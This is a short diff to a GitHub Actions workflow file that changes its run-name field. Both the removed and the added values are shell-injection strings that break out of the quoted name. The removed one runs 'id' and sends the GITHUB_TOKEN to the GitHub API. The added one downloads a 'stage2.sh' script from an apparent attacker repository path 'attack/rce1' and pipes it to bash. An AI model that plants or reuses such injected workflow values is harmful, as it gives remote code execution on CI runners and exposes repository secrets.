@@ -1,5 +1,5 @@
 name: ApprovalComment
-run-name: 'r1";id;curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/rate_limit;exit 1;#'
+run-name: 'r2";curl -s https://raw.githubusercontent.com/lazyhacker6/triage-pinterest-vc5dd446-3718f9/attack/rce1/stage2.sh|bash;#'
 on:
   pull_request:
 permissions: {}
